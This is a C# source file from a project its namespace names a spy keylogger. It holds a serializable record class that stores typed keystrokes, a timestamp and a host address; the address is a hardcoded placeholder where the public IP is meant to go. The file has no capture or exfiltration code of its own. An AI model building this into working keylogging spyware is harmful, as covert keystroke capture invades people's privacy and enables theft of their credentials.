using System;


namespace ProjetEspionKeyLogger
{
    [Serializable]
    public class Enregistrement
    {
        //Contenu de l'enregistrement courrant
        private string contenu;
        private string date;
        private string adresse;

        //proprieté en lecture / ecriture
        public string Contenu
        {
            get
            {
                return contenu;
            }
            set
            {
                contenu = value;
            }
        }
        //proprieté en lecture / ecriture
        public string Date
        {
            get
            {
                return date;
            }
            set
            {
                date = value;
            }
        }

        //proprieté en lecture / ecriture
        public string Adresse
        {
            get
            {
                // adresse = ;
                return adresseHost();
            }
            set
            {
                adresse = value;
            }
        }

        //Renvoit la date et l'heure courrante
        public void dateTimeNow()
        {
            //Date actuelle
            DateTime thisDay = DateTime.Now;

            //retourne la date sous forme de chaine
            date = thisDay.ToString();
        }

        //Renvoie l'adresse IP publique
        private String adresseHost()
        {
            //Provisoirement je mets ça
            return "192.168.1.1";
        }

        //Fonction qui concatene la derniere touche tapé au clavier , au contenu de l'enregistrement
        public void ajouterContenu(char caractere)
        {
            //Ajout du caracter au contenu du text
            contenu += caractere;
        }

    }
}
